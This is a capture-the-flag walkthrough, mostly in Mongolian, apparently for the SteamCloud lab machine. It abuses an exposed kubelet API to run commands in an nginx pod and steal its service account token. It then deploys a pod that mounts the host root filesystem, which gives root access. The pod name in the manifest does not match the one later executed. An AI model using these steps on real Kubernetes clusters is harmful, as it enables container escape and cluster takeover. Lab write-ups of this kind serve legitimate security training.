# SteamCloud - Kubernetes API

**Requirements:**

1. Kubelet API нээлттэй байгааг ашигласан
2. Nginx pod руу команд ажиллуулсан
3. ServiceAccount Token олж авсан
4. Kubectl ашиглаж Cluster удирдсан
5. Pod үүсгэж дараа нь Execute хийж Host system-руу хандсан

## Cluster бүрэлдэхүүн

| Component | Port | Description |
|-----------|------|-------------|
| etcd, etcdAPI | TCP 2379 | |
| kube-apiserver | TCP 8443 | Kubernetes API интерфейс |
| kubelet | TCP 10250 | Node бүрийн агент |
| Pods | - | Контейнерууд багтсан нэгжүүд |

## Kubernetes API - TCP 8443

**Заавал Auth-аар нэвтрэхийг шаардаж байна.**

```bash
kubectl --server https://10.10.11.133:8443 get pod
kubectl --server https://10.10.11.133:8443 get namespaces
kubectl --server https://10.10.11.133:8443 cluster-info
```

## Kubelet API - TCP 10250

**The kubelet agent нь 10250 порт дээр сонсдог.**

```bash
kubeletctl pods -s 10.10.11.133
kubeletctl runningpods -s 10.10.11.133
```

[image]

[image]

## Without Kube-system namespace to RCE

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespaces]'
```

## Shell as root Nginx (pod)

```bash
kubeletctl -s 10.10.11.133 exec "ls" -p nginx -c nginx
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

- **ca.crt**: CA certificate to check kubernetes communications
- **namespace**: Current namespace
- **token**: Service token of the current pod

[image]

## Auth to Kubernetes API

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)

kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```

[image]

## Shell as root

**Шинэ malicious pod үүсгээд root file system руу оруулаад дараа нь Execute хийнэ.**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: shit
  namespace: default
spec:
  containers:
  - name: shit
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl apply -f test-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
kubeletctl -s 10.10.11.133 exec "cat /mnt/root/root.txt" -p zetr0-pod -c zetr0-pod
```

[image]
